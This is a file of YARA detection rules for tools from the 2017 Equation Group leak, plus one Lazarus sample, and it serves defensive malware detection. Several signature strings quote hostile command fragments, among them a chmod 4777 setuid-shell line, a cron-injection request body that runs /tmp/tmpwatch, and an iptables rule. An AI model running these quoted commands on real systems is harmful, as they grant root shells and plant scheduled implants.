      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Target is share name" fullword ascii
      $s2 = "Could not make UdpNetbios header -- bailing" fullword ascii
      $s3 = "Request non-NT session key" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them )
} 

rule EquationGroup_Toolset_Apr17__EAFU_ecwi_ESKE_EVFR_RPC2_4_RID3A9F : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 19:54:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "* Listening Post DLL %s() returned error code %d." fullword ascii
      $s1 = "WsaErrorTooManyProcesses" fullword ascii
      $s2 = "NtErrorMoreProcessingRequired" fullword ascii
      $s3 = "Connection closed by remote host (TCP Ack/Fin)" fullword ascii
      $s4 = "ServerErrorBadNamePassword" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of ( $s* ) or 1 of ( $x* ) )
} 

rule EquationGroup_Toolset_Apr17__SendCFTrigger_SendPKTrigger_6_RID3D29 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 21:42:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "* Failed to connect to destination - %u" fullword wide
      $s6 = "* Failed to convert destination address into sockaddr_storage values" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 1 of them )
} 

rule EquationGroup_Toolset_Apr17__AddResource_RID36A6 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 17:04:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "%s cm 10 2000 \"c:\\MY DIR\\myapp.exe\" c:\\MyResourceData.dat" fullword ascii
      $s2 = "<PE path> - the path to the PE binary to which to add the resource." fullword ascii
      $s3 = "Unable to get path for target binary." fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 2 of them )
} 

rule EquationGroup_Toolset_Apr17__ESKE_RPC2_8_RID358A : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 16:17:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "Fragment: Packet too small to contain RPC header" fullword ascii
      $s5 = "Fragment pickup: SmbNtReadX failed" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 700KB and 1 of them )
} 

rule EquationGroup_Toolset_Apr17__LSADUMP_Lp_ModifyPrivilege_Lp_PacketScan_Lp_put_Lp_RemoteExecute_Lp_Windows_Lp_wmi_Lp_9_RID53B6 : APT DEMO EXE FILE T1047 T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 09:10:30"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1047, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Injection Lib -  " wide
      $x2 = "LSADUMP - - ERROR" wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of them )
} 

rule EquationGroup_Toolset_Apr17__ETBL_ETRE_10_RID35CB : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 16:28:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Probe #2 usage: %s -i TargetIp -p TargetPort -r %d [-o TimeOut] -t Protocol -n IMailUserName -a IMailPassword" fullword ascii
      $x6 = "** RunExploit ** - EXCEPTION_EXECUTE_HANDLER : 0x%08X" fullword ascii
      $s19 = "Sending Implant Payload.. cEncImplantPayload size(%d)" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of them )
} 

rule EquationGroup_Toolset_Apr17__ELV_ESKE_ETBL_ETRE_EVFR_11_RID3A2B : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 19:35:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Target is vulnerable" fullword ascii
      $x2 = "Target is NOT vulnerable" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 1 of them )
} 

rule EquationGroup_Toolset_Apr17__ELV_ESKE_EVFR_RideArea2_12_RID3AA5 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 19:55:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x2 = "** CreatePayload ** - EXCEPTION_EXECUTE_HANDLER" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them )
} 

rule EquationGroup_Toolset_Apr17__ELV_ESKE_13_RID3586 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 16:16:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Skip call to PackageRideArea().  Payload has already been packaged. Options -x and -q ignored." fullword ascii
      $s2 = "ERROR: pGvars->pIntRideAreaImplantPayload is NULL" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 600KB and 1 of them )
} 

rule EquationGroup_Toolset_Apr17__NameProbe_SMBTOUCH_14_RID3956 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 18:59:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "DEC Pathworks TCPIP service on Windows NT" fullword ascii
      $s2 = "<\\\\__MSBROWSE__> G" fullword ascii
      $s3 = "<IRISNAMESERVER>" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )
} 

rule EquationGroup_Toolset_Apr17__ELV_ESKE_EVFR_RPC2_15_RID3890 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 18:26:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "** SendAndReceive ** - EXCEPTION_EXECUTE_HANDLER" fullword ascii
      $s8 = "Binding to RPC Interface %s over named pipe" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 1 of them )
} 

rule EquationGroup_Toolset_Apr17__ELV_ESKE_EVFR_16_RID371B : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 17:24:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "ERROR: TbMalloc() failed for encoded exploit payload" fullword ascii
      $x2 = "** EncodeExploitPayload ** - EXCEPTION_EXECUTE_HANDLER" fullword ascii
      $x4 = "** RunExploit ** - EXCEPTION_EXECUTE_HANDLER" fullword ascii
      $s6 = "Sending Implant Payload (%d-bytes)" fullword ascii
      $s7 = "ERROR: Encoder failed on exploit payload" fullword ascii
      $s11 = "ERROR: VulnerableOS() != RET_SUCCESS" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 1 of them )
} 

rule EquationGroup_Toolset_Apr17__ETBL_ETRE_SMBTOUCH_17_RID3896 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      author = "Florian Roth"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15 18:27:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "ERROR: Connection terminated by Target (TCP Ack/Fin)" fullword ascii
      $s2 = "Target did not respond within specified amount of time" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of them )
} 

rule Enigma_Protector_LazarusSample_RID3326 : APT DEMO EXE FILE T1045 {
   meta:
      description = "Detects malware packed with the Enigma protector"
      author = "Florian Roth"
      reference = "https://securelist.com/blog/sas/77908/lazarus-under-the-hood/"
      date = "2017-04-12 14:35:31"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1045"
      minimum_yara = "1.7"
      
   strings:
      $op1 = { 5d 5d 5d aa bf 5e 95 d6 dc 51 5d 5d 5d 5e 98 0d } 
      $op2 = { 52 d9 47 5d 5d 5d dd a6 b4 52 d9 4c 5d 5d 5d 3b } 
      $op3 = { 9f 59 14 52 d8 a9 a2 a2 a2 00 9f 51 5d d6 d1 79 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them )
} 

rule EquationGroup_gr_RID2D9C : APT DEMO T1136 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09 10:39:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "if [ -f /tmp/tmpwatch ] ; then" fullword ascii
      $s2 = "echo \"bailing. try a different name\"" fullword ascii
   condition: 
      ( filesize < 1KB and all of them )
} 

rule EquationGroup_store_linux_i386_v_3_3_0_RID3570 : APT DEMO FILE T1136 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09 16:13:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "[-] Failed to map file: %s" fullword ascii
      $s2 = "[-] can not NULL terminate input data" fullword ascii
      $s3 = "[!] Name has size of 0!" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 60KB and all of them )
} 

rule EquationGroup_morerats_client_genkey_RID35F0 : APT DEMO T1136 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09 16:34:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "rsakey_txt = lo_execute('openssl genrsa 2048 2> /dev/null | openssl rsa -text 2> /dev/null')" fullword ascii
      $x2 = "client_auth = binascii.hexlify(lo_execute('openssl rand 16'))" fullword ascii
   condition: 
      ( filesize < 3KB and all of them )
} 

rule EquationGroup_cursetingle_2_0_1_2_mswin32_v_2_0_1_RID3920 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09 18:50:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "[%.2u%.2u%.2u%.2u%.2u%.2u]" fullword ascii
      $s2 = "0123456789abcdefABCEDF:" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )
} 

rule EquationGroup_cursesleepy_mswin32_v_1_0_0_RID36EC : APT DEMO EXE FILE T1136 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09 17:16:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "A}%j,R" fullword ascii
      $op1 = { a1 e0 43 41 00 8b 0d 34 44 41 00 6b c0 } 
      $op2 = { 33 C0 F3 A6 74 14 8B 5D 08 8B 4B 34 50 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 2 of them )
} 

rule EquationGroup_cursehelper_win2k_i686_v_2_2_0_RID37A1 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09 17:46:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/{}" fullword ascii
      $op1 = { 8d b5 48 ff ff ff 89 34 24 e8 56 2a 00 00 c7 44 } 
      $op2 = { e9 a2 f2 ff ff ff 85 b4 fe ff ff 8b 95 a8 fe ff } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 500KB and all of them )
} 

rule EquationGroup_morerats_client_addkey_RID35DF : APT DEMO T1136 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09 16:31:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "print '  -s storebin  use storebin as the Store executable\\n'" fullword ascii
      $x2 = "os.system('%s --file=\"%s\" --wipe > /dev/null' % (storebin, b))" fullword ascii
      $x3 = "print '  -k keyfile   the key text file to inject'" fullword ascii
   condition: 
      ( filesize < 20KB and 1 of them )
} 

rule EquationGroup_noclient_3_3_2_RID31D4 : APT DEMO T1136 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09 13:39:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "127.0.0.1 is not advisable as a source. Use -l 127.0.0.1 to override this warning" fullword ascii
      $x2 = "iptables -%c OUTPUT -p tcp -d 127.0.0.1 --tcp-flags RST RST -j DROP;" fullword ascii
      $x3 = "noclient: failed to execute %s: %s" fullword ascii
      $x4 = "sh -c \"ping -c 2 %s; grep %s /proc/net/arp >/tmp/gx \"" fullword ascii
      $s5 = "Attempting connection from 0.0.0.0:" ascii
   condition: 
      ( filesize < 1000KB and 1 of them )
} 

rule EquationGroup_curseflower_mswin32_v_1_0_0_RID36E9 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09 17:16:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<pVt,<et(<st$<ct$<nt" fullword ascii
      $op1 = { 6a 04 83 c0 08 6a 01 50 e8 10 34 00 00 83 c4 10 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )
} 

rule EquationGroup_tmpwatch_RID302B : APT DEMO T1136 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09 12:28:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "chown root:root /tmp/.scsi/dev/bin/gsh" fullword ascii
      $s2 = "chmod 4777 /tmp/.scsi/dev/bin/gsh" fullword ascii
   condition: 
      ( filesize < 1KB and 1 of them )
} 

rule EquationGroup_orleans_stride_sunos5_9_v_2_4_0_RID388D : APT DEMO FILE T1136 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09 18:26:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "_lib_version" fullword ascii
      $s2 = ",%02d%03d" fullword ascii
      $s3 = "TRANSIT" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 200KB and all of them )
} 

rule EquationGroup_morerats_client_noprep_RID3601 : APT DEMO T1136 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09 16:37:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "storestr = 'echo -n \"%s\" | Store --nullterminate --file=\"%s\" --set=\"%s\"' % (nopenargs, outfile, VAR_NAME)" fullword ascii
      $x2 = "The NOPEN-args provided are injected into infile if it is a valid" fullword ascii
      $x3 = " -i                do not autokill after 5 hours" fullword ascii
   condition: 
      ( filesize < 9KB and 1 of them )
} 

rule EquationGroup_cursezinger_linuxrh7_3_v_2_0_0_RID382A : APT DEMO FILE T1136 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09 18:09:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = ",%02d%03d" fullword ascii
      $s2 = "[%.2u%.2u%.2u%.2u%.2u%.2u]" fullword ascii
      $s3 = "__strtoll_internal" fullword ascii
      $s4 = "__strtoul_internal" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 400KB and all of them )
} 

rule EquationGroup_seconddate_ImplantStandalone_3_0_3_RID39CD : APT DEMO FILE T1136 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09 19:19:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "EFDGHIJKLMNOPQRSUT" fullword ascii
      $s2 = "G8HcJ HcF LcF0LcN" fullword ascii
      $s3 = "GhHcJ0HcF@LcF0LcN8H" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 1000KB and all of them )
} 

rule EquationGroup_watcher_solaris_i386_v_3_3_0_RID36FE : APT DEMO FILE T1136 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09 17:19:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "getexecname" fullword ascii
      $s2 = "invalid option `" fullword ascii
      $s6 = "__fpstart" fullword ascii
      $s12 = "GHFIJKLMNOPQRSTUVXW" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 700KB and all of them )
} 

rule EquationGroup_gr_dev_bin_now_RID3285 : APT DEMO T1136 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09 14:08:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "HTTP_REFERER=\"https://127.0.0.1:6655/cgi/redmin?op=cron&action=once\"" fullword ascii
      $x2 = "exec /usr/share/redmin/cgi/redmin" fullword ascii
   condition: 
      ( filesize < 1KB and 1 of them )
} 

rule EquationGroup_gr_dev_bin_post_RID32F7 : APT DEMO T1136 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09 14:27:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "op=cron&action=once&frame=cronOnceFrame&cronK=cronV&cronCommand=%2Ftmp%2Ftmpwatch&time=12%3A12+01%2F28%2F2005" ascii
   condition: 
      ( filesize < 1KB and all of them )
} 

rule EquationGroup_curseyo_win2k_v_1_0_0_RID349A : APT DEMO EXE FILE T1136 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09 15:37:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "0123456789abcdefABCEDF:" fullword ascii
      $op0 = { c6 06 5b 8b bd 70 ff ff ff 8b 9d 64 ff ff ff 0f } 
      $op1 = { 55 b8 ff ff ff ff 89 e5 83 ec 28 89 7d fc 8b 7d } 
      $op2 = { ff 05 10 64 41 00 89 34 24 e8 df 1e 00 00 e9 31 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )
} 

rule EquationGroup_curseroot_win2k_v_2_1_0_RID3578 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09 16:14:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/%s,%s" fullword ascii
      $op0 = { c7 44 24 04 ff ff ff ff 89 04 24 e8 46 65 01 00 } 
      $op1 = { 8d 5d 88 89 1c 24 e8 24 1b 01 00 be ff ff ff ff } 
      $op2 = { d3 e0 48 e9 0c ff ff ff 8b 45 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and $s1 and 2 of ( $op* ) )
} 

rule EquationGroup_cursewham_curserazor_cursezinger_curseroot_win2k_RID40E0 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09 00:21:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/%s,%s" fullword ascii
      $s3 = ",%02d%03d" fullword ascii
      $s4 = "[%.2u%.2u%.2u%.2u%.2u%.2u]" fullword ascii
      $op1 = { 7d ec 8d 74 3f 01 0f af f7 c1 c6 05 } 
      $op2 = { 29 f1 89 fb d3 eb 89 f1 d3 e7 } 
      $op3 = { 7d e4 8d 5c 3f 01 0f af df c1 c3 05 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 3 of them )
} 

rule EquationGroup_watcher_linux_i386_v_3_3_0_RID3631 : APT DEMO FILE T1136 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09 16:45:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "invalid option `" fullword ascii
      $s8 = "readdir64" fullword ascii
      $s9 = "89:z89:%r%opw" fullword wide
      $s13 = "Ropopoprstuvwypypop" fullword wide
      $s17 = "Missing argument for `-x'." fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 700KB and all of them )
} 

rule EquationGroup_charm_saver_win2k_v_2_0_0_RID361C : APT DEMO EXE FILE T1136 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09 16:41:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "0123456789abcdefABCEDF:" fullword ascii
      $op0 = { b8 ff ff ff ff 7f 65 eb 30 8b 55 0c 89 d7 0f b6 } 
      $op2 = { ba ff ff ff ff 83 c4 6c 89 d0 5b 5e 5f 5d c3 90 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them )
} 

rule EquationGroup_cursehappy_win2k_v_6_1_0_RID35DA : APT DEMO EXE FILE {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09 16:30:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "1.7"
      
   strings:
      $op1 = { e8 24 2c 01 00 85 c0 89 c6 ba ff ff ff ff 74 d6 } 
      $op2 = { 89 4c 24 04 89 34 24 89 44 24 08 e8 ce 49 ff ff } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them )
} 

